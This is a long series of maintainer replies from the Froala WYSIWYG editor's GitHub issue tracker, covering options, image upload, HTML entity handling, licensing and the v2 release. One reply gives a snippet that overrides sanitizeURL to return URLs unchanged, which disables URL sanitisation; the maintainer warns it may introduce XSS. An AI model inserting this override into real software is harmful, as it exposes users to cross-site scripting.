However you should be able to use https://github.com/froala/wysiwyg-editor/issues/404#issuecomment-70906962 to upload to S3 directly from the editor and then change the URL in the callback. Only S3 is supported for the moment.\n. I am closing this due to lack of response.\n. You should override the method $.Editable.prototype.handleEnter and put your custom code in it to work the way you want. However, you should be aware that it's very likely to introduce bugs with such behaviour because each browser handles these different. We'll probably add builtin support for specifying how to add new line shortly.\nAlso, we use this repo for bug reporting mainly, not for support. Please use it appropriate.\n. I can't understand what exactly is wrong or how to replicate it. Could you please provide more details?\n. OK. It's an issue there for sure, the image order seems to be changed somehow.\nWe decided to remove the Font Awesome files because it can be included from CDNJS for example. We did the same with jQuery. It looks that we haven't removed the 2 CSS files, but only the fonts directory.\n. We don't have a plugin for emoticons, but you can implement one if you need. The colors plugin can be used as a starting point.\n. Actually this is the way it was implemented. You are right, the class shouldn't be copied. Last commit fixes it.\n. The image SRC will be the one that you pass in the image upload request. If you return the URL without http://example.com the path will be as you want.\n. No, FroalaEditor_Image::upload is designed to return the absolute path. For returning the full url, please follow https://www.froala.com/wysiwyg-editor/docs/server/php/image-upload.. This is how the editor should work by default (hiding all other popups when a new one appears). If you could provide a page where we test and the steps to replicate it, we can investigate.\n. There are few options for that. We might add that in the future because we had few requests for such a thing.\nHowever, I don't see a reason why you'd want to get the unminified sources via bower or npm instead of downloading directly from our website.\n. I'll get back with a comment as soon as we'll create the packages.\n. Will do that shortly :-)\n. Unminified source codes are available only under Advanced and OEM licenses. No exception is made.\n. The editor (minified code) can be downloaded at any time and tested before actually purchasing a license. The license fee is one time payment and it is non refundable.\n. No, there is no update on this yet and it's very unlikely to have that implemented because it would result in additional costs for the license. The editor license is one time payment while there are monthly costs for that. For example, on Github with the new plans for a private repo on Froala organization there would be a cost of $9/month for each user. That is $108/year and for that price most of the users would prefer to download the unminified JS once per month from their account.\n. Hmm.. am I missing something? https://bitbucket.org/product/pricing\n. @benosman thanks for letting us know about Bitbucket. Gitlab looks like a good alternative. \ud83d\udc4d \n. @jpgilchrist thanks for the suggestion. . It looks that you're using an older version. I am saying that because mergeNodes method doesn't exists anymore. Could you please use master the version from this repo? \n. Yes, 1.2.6.\n. Yes, we'd need the document, Operating System and browser used.\nAlso, please open a different issue for each bug and close this issue if the problem doesn't exist in the latest version.\n. I answered to your question on the email. Contacting us in one place is enough. We'll not answer faster if you post in multiple places. Thanks.\n. Could you please give us more details about your use case?\n. Indeed there was a small issue there. However, you should use a <span> instead of a <div>. Also, you should put a class to the span tag so that you can identify it after that in Google Tag Manager. It's not OK to use divs because when you use divs inside  a <p> tag it splits the <p> tag in two.\n. I believe that you should use https://editor.froala.com/options#scrollableContainer\n. It would be odd to focus at the end of the editable area instead of the beginning for 2 reasons:\n1. Most of the the apps (web, desktop, mobile) are focusing at the beginning, not at the end. It will be odd for the users to see focus at the end.\n2. If the area has scroll, it should scroll to the end which would turn into a strange movement of the content.\nSorry, but we'll not add an option for this.\nPS: I checked wysihtml5 and it seems that they are focusing at the beginning too. At least in Safari.\n. There is no builtin method for doing that. If you want such a behaviour you should implement your own method.\n. That method was not created for setting focus at the end of the input, but at the end of a block tag. There might be cases when it will not work correctly if you use it for setting focus at the end of the editable area. That's the reason why it doesn't appear in the official documentation.\n. In v2 you can use the following:\njs\nvar editor  = $(selector).data('froala.editor');\neditor.selection.setAtEnd(editor.$el.get(0));\neditor.selection.restore;\n. Probably you have not added class in videoAllowedAttrs.\nhttps://editor.froala.com/options#videoAllowedAttrs\n. With videoAllowedAttrs: ['src', 'width', 'height', 'frameborder', 'allowfullscreen', 'webkitallowfullscreen', 'mozallowfullscreen', 'href', 'target', 'id', 'controls', 'value','name', 'class'] it works fine.\n. You should set the imagesLoadParams before calling the showMediaManager. The images are reloaded each time you hit the button and this way you'd pass to the server the params that you want.\n. Please see https://github.com/froala/wysiwyg-editor/issues/404#issuecomment-70906962.\nAlso, you have to set the CORS on AWS: https://gist.github.com/stefanneculai/deed108fad534d0db3ff#file-cors-file\n. Actually, it is working as it should. Setting the option shortcuts: false is leaving the browser default behaviour. In Chrome, the default behaviour is to make them bold and italic. Firefox shows bookmarks when CTRL + B is used for instance.\nIf you want to disable browser default behaviour, then you should listen on the keydown event and do that.\n. I couldn't reproduce it locally. Could you please make a jsFiddle?\n. The last commit is how it actually should work. \nWhen you initialize the textarea, you should initialize it with &amp;lt;strong&amp;gt;hello&amp;lt;/strong&amp;gt; instead. So far the editor was not giving the output like this - the last commit updates that and now the output is corrected by changing & to &amp; you initialize the editor on a textarea.\n. Last commit is not changing & to &amp; in the output anymore. That's because you would expect to simply output the edited HTML on the view page and see it displayed correctly. If the entities are outputted like &amp;entity;, then you'd have to decode them before displaying, because otherwise you'd see the entity code (&entity;) and not the character. Moreover, it wouldn't be consistent with initializing the editor on a DIV element.\nTextareas have a odd behaviour:\n- If you have the HTML &lt;strong&gt;hello&lt;/strong&gt;, then it's value would be <strong>hello</strong>\n- If you have the HTML <strong>hello</strong>, then it's value would be as well <strong>hello</strong>\n- If you have the HTML &amp;lt;strong&amp;gt;hello&amp;lt;/strong&amp;gt;, then it's value would be &lt;strong&gt;hello&lt;/strong&gt;\nThat's why if you initialize the editor on a textarea, save the content and then you want to edit the content again, you'd have to encode entities when you set the textarea value. To encode the entities you can use any function similar to htmlentities from PHP.\n. If you'd provide the steps to replicate it, we can investigate it further.\n. I'm closing this because we haven't got enough information.\n. It is not an issue. Inside textareas, the & from HTML entities should be changed to &amp; in order to keep the HTML entities escaped properly. See http://jsfiddle.net/kye495zv/. To display it as HTML you should use html_entity_decode in PHP for example.\nRegarding your 2nd comment, &nbsp; is used only after other HTML tags. Otherwise, there might appear some rendering issues sometimes and the space not appear properly.\n. There are some cases when the images are not pasted from clipboard because of clipboard limitations. For example, in Safari this feature doesn't work.\nWe offer tech support only for users who have  license that includes support. If you have such a license please contact us.\n. There are 4 options that upload to i.froala.com by default. You should make sure none of them is set.\nimageUploadURL, imagesLoadURL, pastedImagesUploadURL and fileUploadURL.\n. I cannot replicate it. Please create a jsFiddle. The MeteoPad app works very slowly and it's hard to debug in it.\n. What browser and OS are you using? I still can't replicate it.\n. I managed to replicate it. There will be a fix shortly. Thanks.\n. Actually, the option is false when the editor is not initialized on a link and true when the editor is initialized on link. We'll update it to be false in both cases for consistency.\n. It's updated.\n. There is no problem. By default the input has ltr direction and is expected to have the cursor at the end. If you want to type in rtl languages, then you should use the option direction and set it to rtl.\nThere is already an example for that. You can as well just include the Hebrew language and it will work as you want. More details can also be found on our article about languages.\n. The issue is fixed on the master version.\n. Sorry, but we don't have a specific date for it yet. Most probably during April.\n. You shall contact us via our website with more details.\n. Unminified JS is available only for Developer, Business and OEM licenses.\n. We don't accept pull requests for the code. If you find any issue you shall report it and we'll fix it at our end. We have this policy because accepting patches from other developers might introduce unexpected issues. We have automated tests, but there are bunch of tests that have to be run manually and no one will do that when they make a pull request.\n. We haven't thought of such cases. We'll fix it shortly.\n. We don't accept direct PRs, however we added the Estonian translation (669774d67448668641a4ae2f50fe3a37c262ef5a). Thank you!\n. We cannot replicate it on http://editor.froala.com. Most probably you have few other things that interact with the editor and make it not to work properly.\n. We'll try to increase the area of the handlers on smaller devices to make it easier to resize. The handlers are already bigger than on desktop so that they are easier to grab.\n.

If you have such a license please contact us via http://editor.froala.com/contact.\n. Please follow the discussion from https://github.com/froala/wysiwyg-editor/issues/461.\n. @philfreo As it is explained on https://github.com/froala/wysiwyg-editor/issues/461#issuecomment-82215158, simply browsers don't make any difference between &lt; and < in textareas. Maybe you still think that is an issue of the editor, but look at this example https://jsfiddle.net/op7ou7da/. It's impossible to tell which of the < > are text and which are from actual HTML code. Inside textareas, a < can come either from < or &amp;. That's why inside textareas, the text should be encoded like &ampentity;.\n@frankrue My bad, I was not paying enough attention to your example. There will be an update for it shortly.\n. Yes, that is right. Right now other text characters than >, < and & are not escaped. We're working on a solution for that. Is there anything else that doesn't work as expected?\n. There is a new plugin for handling entities. We decided to implement this as a plugin because not everyone will want to have the entities encoded.\n. The event should have contained the $img object as well. Last commit fixes that and now the event is editable.imageAltSet (e, editor, $img). Same applies for other image events such as imageFloatedLeft or imageFloatedRight.\n. I don't understand fully what you're asking. You're pasting the HTML in the text mode or in HTML mode?\n. That's because you have the paragraphy option enabled. When this option is set to true empty lines are always wrapped in P tags. If you don't want this to happen, then you should disable it.\n. Is this happening on the version from master? If yes, could you please send a link to the jsFiddle?\n. OK. I was able to replicate it. There will be a fix for it shortly. Thank you for all the details and the jsFiddle.\n. In V2, the paragraphy option was replaced by enter.\n. See https://www.froala.com/wysiwyg-editor/docs/examples/enter\n. You should set it to $.FroalaEditor.ENTER_BR. That is explained in the link I gave you above.\n. The editor is designed not to allow UL inside P. This structure is not W3C valid: http://stackoverflow.com/questions/5681481/should-ol-ul-be-inside-p-or-outside\n. The issue comes from a part of code that was not changed since the release of version 1.2.5. It seems to happen when you hit enter, but I can't replicate it in any way. Could you provide few more details about what you were doing?\n. Thank you for the steps to replicate it. That helped a lot.\n. There is no issue from the editor, but you're not using this right. We use this repo for bug tracking, not for offering support. Please read https://github.com/froala/wysiwyg-editor#reporting-issues. Thank you.\n. https://github.com/froala/wysiwyg-editor/commit/1198e835674410e9443548d88b285c4165cb380a removed the nofollow parameter from the writeLink method and now the parameters are (url, text, cls, blank, attrs) where attrs is an object that contains the attribute names and their values {title: 'Amazing link', rel: 'nofollow'}.\n. You're embedding code that is loaded over http and your page is https. The protocol should match in order not to give such error. It's not because of the editor.\n. We haven't made any changes recently to how the embedded html is inserted or update it in any way.\n. Please provide few more details about wysiwyg must sanitize { } values to... No symbols { and } stayed in code.\n. Which is the original HTML that you put in there? Please continue discussion on #496.\n. Thanks for all the details. There will be a fix shortly.\n. Fixed https://github.com/froala/wysiwyg-editor/commit/c2fbdd2815ffc1a8c7c88e70ddddfc155e2972e9.\n. We have already answered you via the email you sent us through http://editor.froala.com/contact. \n. We have investigated this and it looks like there was something processed badly on the initial paste. Could you please let us know what browser are you using and if you are using the plainPaste option?\n. I am closing this issue due to lack of communication.\n. Fixed b3b7c1e57e38323d281e0b1a579fddd3f813720f\n. https://editor.froala.com/options#defaultImageWidth\n. Please create a JSfiddle for it, otherwise we can't test it.\n. Sorry, but MathJax is not compatible with our editor. The way MathJax creates the output makes it impossible to render fine in Froala Editor.\n. We got your message from http://editor.froala.com and already answered to you but on the email you specified we keep getting Delivery Status Notification (Failure) when we try to reply to you. Please email me directly on stefan@froala.com and I will assist you further. Thank you.\n. Please read https://editor.froala.com/options#pastedImagesUploadURL.\n. @philfreo I've tried to replicate it but with no success. Could you please provide the steps to replicate it?\n@Dobbler please open a different issue - it doesn't seem to be related. Also, we'd need the steps to reproduce it. Thanks.\n. @philfreo could you please provide more details?\n. I am closing this issue because we cannot reproduce it. If we'll get enough details to reproduce it, we'll reopen it and investigate further.\n. https://jsfiddle.net/gqg86mbe/ uses jQuery 2.1.0 and it works without problems. There shouldn't be any problems with version 2.1.3. I believe that you have some other JS that prevents the editor to work as it should.\n. There is no maxWidth option.\n. Is that happening with the master version? If so, could you please make a jsFiddle for it?\n. The editor box doesn't has any width set and it takes the width of the parent element. Probably you have a CSS rule that prevents that from happening. It's not an issue of the editor but something from your CSS for sure.\n. We don't accept direct PR, but I did the changes you spotted and fixed it in the last commit. Thank you!\n. The option is called saveParam.\n. I don't see any reason for implementing in the editor a mechanism to check when the page is left. The action of leaving the page is not related to the editor, but to how the page itself works. If someone wants such a behaviour, he should implement it separate of the editor and check if there is any content unsaved and display a popup to the user.\n. See error code 5. https://editor.froala.com/concepts/image-upload\n. Please send us a link to what you're copying.\n. Thank you all for bringing this to our attention. We'll fix this as soon as we can.\n. We will fix it as soon as we can, but I can't tell you a specific date.\n. Bugs reported by customers with a license have higher priority. We haven't had any email on https://froala.com/contact about this issue froma paid customer so far and that's why it wasn't fixed yet.\n. It doesn't in plainText mode. When plainText is set to false the tags that are kept are the one specified in allowedTags option.\n. Last commit allows the text to have the direction auto. However, it is not possible to detect that and change the toolbar accordingly.\n. Could you please try the master version and let me know if you experience the same issue? It seems to work fine to me with the master version.\n. Thank you for all the details. We'll fix it shortly.\n. We update the bower version to the latest version from Github only when an official release is made. For the moment version 1.2.7 is under development.\n. http://stackoverflow.com/questions/20196707/can-i-add-a-git-repository-to-my-bower-json explains how to include with bower from Github.\nWe don't have a release date set yet for the new version.\n. Last commit fixes it. Because of IE9 limitations, the files array will be undefined.\n. Probably that is because the popups appear outside of the ui-page element. Setting the option scrollableContainer to the ui-page might fix your issue.\n. That is indeed an issue which will be fixed in the version 2.0.0.\n. Should be fixed on master.\n. The is no reason why it wouldn't be compatible with Ember.js. If you can reproduce the issue with the master version and create a jsFiddle for it we can definitely check it further.\n. @alfakini eace9bac7f6d787f208704780bd2bcd79c255264 already fixes it.\n@digggggggggg for the moment the development process is not opened.\n. As soon as the new release is made, in the first part of May.\n. Please provide us the steps to reproduce it. We would need the HTML you're setting. \n. Thank you for all the details. We'll investigate it shortly.\n. Could you please explain why you need to wrap it into the <script> tag? It works if the template is not wrapped in the <script> tag.\n. If you just put the inner content of the <script> tag it works. Wrapping the template inside the <script> tag is not valid W3C. \n. This repo is for bug reporting. For tech support you should contact us via our website.\n. Are you using the master version?\n. @MorphosysCL could you please let us know if you experience this with the master version? If yes, then could you also make a jsFiddle?\n. In version 1.2.7, that option has been removed and the following option should be used instead:\njs\ncolorGroups: [\n      {\n        text: 'Text',\n        cmd: 'foreColor'\n      },\n      {\n        text: 'Background',\n        cmd: 'backColor'\n      }\n    ],\n. Could you please make a jsFiddle for it? \n. There might be persons who would prefer to have the name inserted. We'll add an option for setting this.\n. The imageResizeEnd doesn't pass the img as parameter. We'll update the event to pass the img as well.\n. See https://github.com/froala/wysiwyg-editor/blob/master/examples/events/imageResize.html for an example.\n. Could you please try the master version? It should work fine on the master version.\n. I am closing this issue due to lack of response.\n. It is not possible at this point. We're currently developing the version 2.0 that will have a special option for that.\n. image.uploaded event can be used in V2 for parsing a custom response from the server and insert that image.. You could either pass \"link\": \"\" so that the error is not triggered, or use the same param from image.error event. It is not documented, but the response is there as well.. In the server response. We use this repo for bug tracking only. We offer tech support under the Advanced and OEM license via email. Please contact us there for extending the editor.. You could filter that using the getHTML event https://github.com/froala/wysiwyg-editor/blob/master/examples/events/getHTML.html.\n. This was fixed on the master version.\n. I cannot reproduce it on the master version. Have you tried the master version?\n. The version 1.2.7 will be available on Bower and other plugins only when the it gets officially released. The only way would be to download it from here and include it manually.\n. It is fixed on the master version from https://github.com/froala/wysiwyg-editor\n. We have automated tests that are always ran before updating the repo. There are users who use the version from there.\n. Using CSS classes is better for SEO purposes and it is much cleaner. We'll keep using classes.\n. Done in v2.0.0-rc.1.\n. We use this repo only for bug tracking. If you have a license that includes support, please contact us via our website. Thank you.\n. We don't merge PR directly here. However, we applied this fix. Thank you!\n. Please make sure you use the latest version. We have added an example for it as well.\n. We have just tested this on the master version and it works fine.\n. We have tested this on the master version and it works without problems.\n. Are you using the master version or an older version?\n. In the HTML view, the copied text will always be pasted as plain text and that cannot be changed. For pasting in the editing mode, you can listen to the beforePaste event and handle pasting the way you want. \n. We'd need few more details so that we can clean it by default.\n- what browser are you using?\n- where are you copying from?\n- are you using plainPaste?\n. There is no issue with pasting on the master version in IE11 or at least we cannot replicate it.\n. We cannot reproduce the issue on the master version. If you could try the master version and let us know if you still have the problem that would be great.\n. b.clipboardData might be undefined, but pasting should work anyway. Could you give more details about where you're copying from?\n. We have just tried it again, but we cannot replicate the issue. It is odd that the code is passing the if condition when b.clipboardData is undefined. Would it be possible to send us a link to a page where you are doing that? If you don't want to make it public, you send it to us via the contact form from our website.\n. Last commit should fix this as well. Could you please test?\n. @sunstorymvp please test with the master version.\n. We're updating other packages only after the official release.\n. You can add the attribute contenteditable=\"false\" to those elements that you don't want to edit. The version 2.0.0 will come with a more advanced mechanism builtin for that.\n. Last commit adds the new lines that were missing. The fact that the rest of the style is not copied is not an issue. CLEditor keeps all the inline style from the original site which is a total no from us.\n. We're updating the website version as soon as we make the release of the version 1.2.7. That will be for sure during next week.\n. We're currently working on an improved version for the editor 2.0.0. The new version will have better cleaning algorithms and options for keeping inline styles if someone may want that.\n. Disabling it may introduce XSS vulnerabilities and its not recommended. It would be better to pass such variables differently such as starting with an underscore.\n. Adding an option for that might introduce vulnerabilities, because anyone can change the option using the JS console. You could do the following if you want to disable that:\njs\n$.Editable.prototype.sanitizeURL = function (url) {\n    return url;\n}\n. The editor is outputing the HTML according to the HTML5 specs. However, you can use the getHTML event and make the changes you need using a RegEx.\n. Last commit fixes it. Those comments appear because they are copied in the clipboard.\n. The last commit adds in the option iconClasses which is an array with the classes for the icons. Its default value is ['fa-'].\n. It's added now.\n. I can confirm the issue. We'll fix it in a few days.\n. It is by design. Clear formatting removes other formatting, but not the block tag.\n. If you don't want to upload files, you should simply not include the File Upload plugin. There was a problem and setting pasteImage to false together with imageUpload was not working. Last commit fixes that.\n. In V2, the option names are different: \n- pageImage is imagePaste\n- imageUpload was remove and $.FroalaEditor.POPUP_TEMPLATES.imageInsert should be changed instead\n- imageInsertButtons should be changed as well\n. @lebart using image.beforeUpload event should help.\n. @angusgrant you can easily do that by changing the imageInsertButton option and remove imageUpload from it.. We use this repo for bug reporting and not for support. Please read https://github.com/froala/wysiwyg-editor#reporting-issues.\n. We use this repo for bug reporting and not for support. Please read https://github.com/froala/wysiwyg-editor#reporting-issues.\n. It's not an issue, but adding &nbsp; is necessary to make the whitespaces appear. \n. Last commit fixes it. \n@VeeeneX that is perfectly right, but the editor should clean XSS as well. Indeed, it is recommended to make a XSS clean on the server, because client might fool the editor send it bad HTML using the JS console.\n. The editor could be wrapped within a DIV and use that DIV to resize the editor. The element the editor is initialized on might already have an ID and there is no sense in overriding it.\n. The blockStyles is not designed to work for li, but only for the content inside. Version 2.0.0 will come with options for setting class to li as well.\n. Done in v2.0.0-rc.1.\n. You can use At.js https://github.com/ichord/At.js/tree/master.\n. If you can provide a jsFiddle we can definitely look into it.\n. @dubvfan87 @brownstoneacademy could you please confirm that you're using the master version?\n. @dubvfan87 could you please check 0336377657b2b0120940737d4b352ac3017f47db and let me know if it fixes the issue? Thanks!\n. It is not working because image upload is not using $.post. However, you can pass the CSRF tokens through https://www.froala.com/wysiwyg-editor/docs/options#imageUploadParams.\n. Inside textareas  HTML entities should be escaped. See https://github.com/froala/wysiwyg-editor/issues/482#issuecomment-83714915.\n. We have already addressed this issue in the version 2.0.0. In fact we've rebuilt from ground the table tool in the new version. And no, Froala is not based on CKEditor only that there is no width set to the table cell and that's why it resizes while you type.\n. Improved in v2.0.0-rc.1.\n. How are you saving the content of the editor to the DB? It should not send <br> tags inside <pre>.\n. You're not using it right. Please see https://froala.com/wysiwyg-editor/docs/examples/getHTML.\n. The initialized event should be bind before the editor is initialized in order to work.\n. This is the way all editors work, starting from Word to mail clients and other rich text editors.\n. It's not an issue. Please see https://www.froala.com/wysiwyg-editor/docs/options#defaultImageWidth\n. That's a nice enhancement, but it is not designed to work this way.\n. Done in v2.0.0-rc.1.\n. The problem seems to happen only after a certain amount of scroll. I've reopened the issue and we'll review it.\n. We're working on a new release 2.0 and we have already addressed this issue. It will be available very shortly.\n. We don't have a specific release date, but it will be in the following weeks.\n. Yes, all HTML generated in version 1.* will be compatible with version 2.0.\n. We're writing the migration guide from v1 to v2 right now and it will be published on our website as soon as we finish to write it. Sorry to keep you guys waiting.\n. Should be fixed on master.\n. I couldn't replicate it. Are you experiencing that on the master version? Also, please notice that the changes propagate to the hidden textarea based on the typingTimer option. \n. We cannot reproduce this issue. Could you please provide more details?\n. I am closing this due to lack of communication.\n. Fixed. Thanks for pointing that out.\nThe head was an error on our side. It should be $ instead. We correct it as well.\n. The issue is mainly fixed, but there are still some edge scenarios when the issue occurs in the version 1.*. In version 2 that we'll release next week most probably the issue will be fixed completely. \n. I understand that you are rushing, but please stop spamming us. We'll not fix issues faster if you keep spamming us. As I said it will be fixed in the version 2.0. Today we're starting to write the documentation for it (https://twitter.com/froala_labs/status/615468201313456128). Once we finish the documentation we'll release it. Taking into consideration that we have to rewrite the entire documentation it won't be ready before Friday for sure.\n. It's fixed on the master.\n. Because of the way HTML is rendered on the web that is not possible. MS Word is not using valid HTML and that's why they can align the list items that way.\n. Could you please provide the steps to reproduce the issue?\n. That's because you have not added area to the selfClosingTags option. \n. It was a problem from the URLS plugin. Nice catch. :+1: \n. The URLs plugin is what you're looking for https://www.froala.com/wysiwyg-editor/docs/plugins\n. The plugins can be found inside the downloaded archive js/plugins and here as well.\n. It doesn't happen on master.\n. Should be fixed on master.\n. @kotmatpockuh V2 has fixed many issues that were present in V1 and the current issues that are opened are minor ones that happen only in certain situations and they will be fixed in the following days as well.\nThere will be an update for V1 later this month as well where we'll fix few issues, but I cannot tell you yet if this will be addressed or not. Because of the particular design of V1, few issues cannot be fixed.\n. Should be fixed on master.\n. I have just checked and it is working fine. There is no problem in the master version.\n. I can't see any reason why you would want to count HTML characters. Could you give more details?\n. It is a very weird case and I don't think there are developers doing similar things. I never saw an app working like this with a rich text editor. \nIf you want you could extend the plugin for your needs and use it this way. However, it is very not user friendly because the end user sees the text, not the html.\n. @wboka I believe this is a bit out of the editor context because a regular user is usually not aware of the HTML underneath. If you would like to make these changes, I would recommend to use the char counter as a starting point and make the necessary modifications over it.. As I already told you by email we don't have any plans on implementing it, however you can use the source code and extend the toolbar behaviour for your needs.\n. You should use inlineMode: true if you want such a thing. \nAlso, please notice that there is no free version and you have to purchase a license in order to use the editor.\n. As I said in the last message, you can do that by using inlineMode: true. Moreover, you can use the idea from http://debuggable.com/posts/run-intense-js-without-freezing-the-browser:480f4dd6-f864-4f72-ae16-41cccbdd56cb to initialize multiple editors without having the browser freeze.\n. Bold is designed to change the text, not other elements. The numbers before list items are not text and browsers do not allow to simply change the list item numbers to bold.\n. Please do not SPAM. Since you have already opened an issue on https://github.com/froala/wysiwyg-rails/issues/20 it's enough.\n. You could implement a custom dropdown and make it work this way. It doesn't make too much sense to add such a feature by default in the editor because ID is intended to use only once on the page and the users who are editing the page usually don't have tech knowledge about that.\n. You could use https://www.froala.com/wysiwyg-editor/docs/events#beforeImageUpload.\n. The documentation explains that you can cancel the image upload by returning false. Then you can use the images param from the event to get the image and insert it into the editor using the writeImage method. However, it is not recommended to use images this way because the browsers doesn't handle very well images in base64 inside contenteditable elements and you might end with a non-responding page.\nWe use this repo mainly for bug tracking. If you have questions or need help integrating the editor please contact us instead of opening an issue.\n. Thanks for letting us know about the typo in the docs. It's fixed now.\n. You could listen to the afterSave and contentChanged event and if any contentChanged event is triggered between 2 save requests then there are unsaved changes.\n. Could you please let me know what browser are you using?\n. Could also please let me know what OS are you using?\n. That's the way it should work.\n. Version 2.0 will come with an option for that.\n. Yes, v2.0 will come with this feature. It will be released by the end of August.\n. Option added in v2.0.0-rc.1.\n. There are builtin options for that, please see https://github.com/froala/wysiwyg-editor/blob/master/html/show_selection.html#L130. \nThe html property allows you to set any custom HTML in the dropdown, but you shouldn't need it because there are builtin options. Examples of using the html function can be found in the paragraph format plugin.\n. There is a different shortcut for that (https://www.froala.com/wysiwyg-editor/shortcuts): \nCtrl + ] or \u2318 Cmd + ]\nIndents the current paragraph.\nHowever, shortcuts can be changed.\n. The showInsertImage changes the content of the popup to show the insert image content. In order to actually show the popup, you also have to call the showByCoordinates method which places the popup at the desired position.\n. It might be something from Ionic. On our tests this works fine.\n. Should be fixed on master.\n. Hi Ken! Yes, that is true and we have not put there the default option mainly because of the small space for default option. There will an update on that during August that will fix this.\n. The list can also be indented by hitting the indent button from the toolbar. Most of the editors indent using TAB and it's most like a default thing.\n. The editor doesn't has any built-in scrollbar. If you want to use a custom scrollbar, then the element you should set the scrollbar on is $(selector).data('fa.editable').$wrapper.\n. $(selector).data('froala.editor').$wp\n. Hi Scott! The current Word support is acceptable for most of the users. We might create later on a separate plugin for advanced Word paste, but we can't promise anything about that.\n. It would be a nice feature, but for the moment we're focusing our resources on some different features that are more common. Very few users will want to embed gists.\n. Could you please make a JSFiddle for that? Also, are you using the latest version of the editor?\n. We cannot replicate this. I am closing this until we received the steps to replicate it.\n. Thanks for letting us know about it.\n. You're initializing the editor on an image. When you're initializing the editor on an image it doesn't make sense to set minHeight which is an option for the editable area. Everything works fine if you remove minHeight.\n. Hi Christopher! In the current version the editor is designed to include blockquote inside list. Considering how emails work, I believe it would be good to include list inside blockquote not otherwise. We'll discuss about that.\n. Done in v2.0.0-rc.1.\n. Inline styles, classes and ids are removed when pasting. Version 2.0 will have more control for that. See https://github.com/froala/wysiwyg-editor/issues/552#issuecomment-106766541 for more details.\n. @ibtisamniche-vteams please see https://github.com/froala/wysiwyg-editor/issues/2545#issuecomment-363143440.. The editor behaviour is the correct one. If you hit enter at the middle of a tag it should split the current tag in two. Only when you are at the end of a tag it should not be spliced.\n. You'd have to override the method $.Editable.prototype.handleEnter and make it work the way you want.\n. That is a limitation in version 1.*. Version 2 will fix that.\n. Should be fixed on master.\n. Should be fixed on master.\n. We're aware of this. Same thing can be reproduces with tables and this behaviour will be improved in version 2.0.\n. Should be fixed on master.\n. Should be fixed on master.\n. Should be fixed on master.\n. Could you please let me know what browser are you using?\n. Should be fixed on master.\n. By default the style tag is not allowed in the editor. You should enable it: https://www.froala.com/wysiwyg-editor/docs/options#allowStyle.\n. Same with #628.\n. The editor recognises iframes and uses those as videos. By default, Youtube is embedding iframe not object.\n. There is a plugin for entities (https://github.com/froala/wysiwyg-editor/blob/master/js/plugins/entities.min.js) and you should use that one if you want to have the bullet/asterisk chars as html entities.\n. Indeed it is missed. We'll include it shortly.\n. That is the correct behaviour. When you hit enter for the first time, it will break the initial div into two div elements. The 2nd enter is made at the beginning of a div and it should add an empty line above it, which the editor does.\n. I assume you're relying on style for the editor box?\n. You have to store the selection using saveSelectionByMarkers when you open the modal and then restore the selection using restoreSelectionByMarkers before inserting the HTML. Also, you should probably use insertHTML instead of setHTML.\n. @jwhitmarsh You can save the current selection using selection.save and restore it with selection.restore. https://www.froala.com/wysiwyg-editor/examples/selection\n. I don't really understand what exactly you're trying to achieve. Could you offer more details?\nThe unminified plugins are available under the Advanced/OEM license.\n. You could create the list object based on the use that is logged in and then just pass it to the custom dropdown. We've had users doing the same thing. Have your read https://www.froala.com/wysiwyg-editor/docs/examples/custom-dropdown?\nWe can definitely help you via email as part of the support included in the Advanced/OEM license. The license fee is one time payment and it is not refundable. Indeed, we offer a 30% discount, but only to new  plugins for frameworks or major contributions to the existing ones.\n. :+1: \n. That is the intention. In inline mode, sep creates a new line. That is explained in docs as well: https://www.froala.com/wysiwyg-editor/docs/options#buttons\n. What you should use is the blockTags option. The formatTags option is used to specify what tags you want to be formatted inside the HTML view.\n. It's a mistake in our documentation. The undo event is now afterUndo and there is a similar event called beforeUndo.\n. The undo event can be take using the commands.after event in V2.\n. With toolbarFixed set to false, the toolbar will remain at the top of the screen when you scroll. There is also an example on our website for that: https://www.froala.com/wysiwyg-editor/docs/examples/fluid-toolbar.\nHowever, there might be something from jquery mobile that prevents it from working fine. If you can provide a page where you have this problem we can definitely look into it.\n. I don't see any problem when I open only the example (https://jsfiddle.net/jh7dwcjv/7/embedded/result/). The toolbar is staying at the top of the page.\n. That's because parent tags have the CSS property overflow-x: hidden. We're using the CSS property position: sticky and it works fine only when parents don't have overflow hidden.\n. Should be fixed on master.\n. There is no default option to upload to Imgur. However, you could intercept the image upload (https://www.froala.com/wysiwyg-editor/docs/events#beforeImageUpload) and then do the upload to Imgur on your own.\n. Only one image can be uploaded at a time. At this moment, uploading multiple images is not on our roadmap.\n. Could you please make a jsFiddle?\n. This problem is no longer present in V2. We have also added an example for it: https://github.com/froala/wysiwyg-editor/blob/master/html/jquery_ui/modal.html.\n. What browser are you using? Could you please provide a jsFiddle for it?\n. When a HTML page is opened in the browser without a server, then images might get copied from their local path. This results in an error when HTTPS is being used. The way browser handles coping only one image and image with text is different. \nLast commit adds in the option pasteAllowLocalImages which is disabled by default. That will prevent pasting in local content.\n. Should be fixed on master.\n. You should also call the hide method if you want to hide everything.\n. It's not documented, but there is a method called closeImageMode.\n. Should be fixed on master.\n. This is the intended behaviour. When you change the block format it should not change the styles within the block.\n. If you want such a behaviour then you should override the $.Editable.prototype.formatBlock method to work the way you want. However, it is not something your users would probably expect to because all text editing apps work this way.\n. The editor cannot be resized. You can set a height for it or doesn't set any height and the editor size will automatically grow.\n. https://www.froala.com/wysiwyg-editor/docs/options#heightMin. Duplicate of #612.\n. We know that. To keep the OL when pasting from Word in other browsers than IE requires a lot of additional code and we might create a plugin for that in the future. However, we cannot commit to that right now.\n. Should be fixed on master.\n. We're aware of this and it is fixed in v2.\n. Should be fixed on master.\n. V2 will come with builtin support for editing email templates. https://www.froala.com/blog/the-final-sprint-for-v2\n. Improved in version 2.0.0-rc.1. If you want to edit email templates without problems, then you should enable the fullPage option and set the imageIframeStyle, tableIframeStyle and videoIframeStyle to ''. There will be a detailed article about that on our website soon.\n. Should be fixed on master.\n. Could you please send us an Excel file on which that happens? We couldn't replicate this.\nAlso, could you please mention the OS and browser you're using?\n. Should be fixed on master.\n. It's documented on https://www.froala.com/wysiwyg-editor/docs/concepts/image-upload:\nReturning a JSON with an error field will throw an error with the custom message contained. E.g. { error: 'My custom error message.' }\n. You could return a stringifyed JSON and then convert it into the handler. So, your response would be {error: \"{\"code\":1000,\"message\":\"Your message\"}\"}.\n. @sureshy02 most likely the path is incorrect. You should be able to access the image URL in browser: http://localhost:4000/uploads/abc.png. . I can confirm this is an issue.\n. In v2 this is no longer a problem.\n. On paste the editor is removing the style attribute. It is not an issue, but this was implemented on purpose. \n. Hi Rob! Are you using the master version?\n. Thanks for tracking this Rob. We'll give it a try ourselves to see how it 